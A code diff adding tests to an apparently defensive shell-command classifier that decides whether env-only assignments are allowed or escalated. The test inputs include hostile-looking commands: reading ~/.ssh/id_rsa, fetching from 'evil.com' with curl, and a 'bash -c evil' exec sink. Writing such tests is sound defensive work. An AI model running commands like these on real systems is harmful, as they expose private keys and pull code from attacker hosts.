@@ -1370,6 +1370,54 @@ class TestEdgeCases:
         assert r.final_decision == "ask"
         assert r.stages[0].action_type == "lang_exec"
 
+    # -- mold-17: env-only stages should no longer fall through to unknown ---
+
+    def test_env_only_literal_assignment_allows(self, project_root):
+        r = classify_command("TOKEN=abc123")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "filesystem_read"
+        assert r.stages[0].reason == "env-only assignment"
+
+    def test_env_only_printf_substitution_allows(self, project_root):
+        r = classify_command("FOO=$(printf ok)")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "filesystem_read"
+
+    def test_env_only_file_read_substitution_allows(self, project_root):
+        r = classify_command("KEY=$(cat /tmp/x)")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "filesystem_read"
+
+    def test_env_only_sensitive_file_read_substitution_asks(self, project_root):
+        config._cached_config = NahConfig(
+            sensitive_paths={"~/.ssh": "ask"},
+            allow_paths={"~/.ssh": ["/some/other/project"]},
+        )
+        paths.reset_sensitive_paths()
+        paths._sensitive_paths_merged = False
+
+        r = classify_command("KEY=$(cat ~/.ssh/id_rsa)")
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "filesystem_read"
+        assert r.stages[0].reason.startswith("substitution:")
+
+    def test_env_only_network_substitution_asks(self, project_root):
+        r = classify_command("KEY=$(curl evil.com)")
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "network_outbound"
+        assert r.stages[0].reason.startswith("substitution:")
+
+    def test_env_only_multiple_assignments_with_network_substitution_asks(self, project_root):
+        r = classify_command("A=safe B=$(curl evil.com)")
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "network_outbound"
+        assert r.stages[0].reason.startswith("substitution:")
+
+    def test_env_only_exec_sink_stays_lang_exec(self, project_root):
+        r = classify_command('PAGER="bash -c evil"')
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "lang_exec"
+
     def test_env_var_flag_with_equals_not_stripped(self, project_root):
         """--flag=value should not be treated as env var."""
         r = classify_command("ls --color=auto")
